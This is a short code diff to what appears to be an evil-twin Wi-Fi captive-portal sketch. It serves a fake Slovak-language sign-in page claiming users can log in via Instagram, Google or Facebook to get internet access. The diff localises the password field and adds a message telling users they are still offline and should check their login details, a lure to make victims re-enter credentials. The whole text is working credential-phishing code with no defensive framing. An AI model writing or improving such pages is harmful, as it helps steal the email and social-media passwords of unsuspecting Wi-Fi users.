@@ -25,7 +25,7 @@
 #define TITLE "Prihlásenie"
 #define BODY "Je možné prihlásiť sa napríklad cez Instagam, Google, Facebook pre internetové pripojenie."
 #define POST_TITLE "Overuje sa..."
-#define POST_BODY "Váše prihlásenie je v procese. Prosím, počkajte 1 minutu pre pripojenie .</br>Ďakujeme za trpezlivosť.</br>Pripojení ONLINE používatelia: 26</br>Stat: Active"
+#define POST_BODY "Váše prihlásenie je v procese. Prosím, počkajte 1 minutu pre pripojenie .</br>Ďakujeme za trpezlivosť.</br>Pripojení ONLINE používatelia: 26</br>Stav: Zatial ste OFFLINE</b>Ak sa nedokážete pripojiť, skontrolujte vaše prihlasovacie údaje !>"
 #define PASS_TITLE "Credentials"
 #define CLEAR_TITLE "Cleared"
 
@@ -119,7 +119,7 @@ void setup() {
   });
   
   webServer.onNotFound([]() {
-    webServer.send(HTTP_CODE, "text/html", header(TITLE) + "<form action='/post' method='post'><b>Email:</b> <input type='text' name='email'><br><b>Password:</b> <input type='password' name='password'><br><input type='submit' value='Sign in'></form>");
+    webServer.send(HTTP_CODE, "text/html", header(TITLE) + "<form action='/post' method='post'><b>Email:</b> <input type='email' name='email'><br><b>Heslo:</b> <input type='password' name='password'><br><input type='submit' value='Sign in'></form>");
   });
   
   webServer.begin();
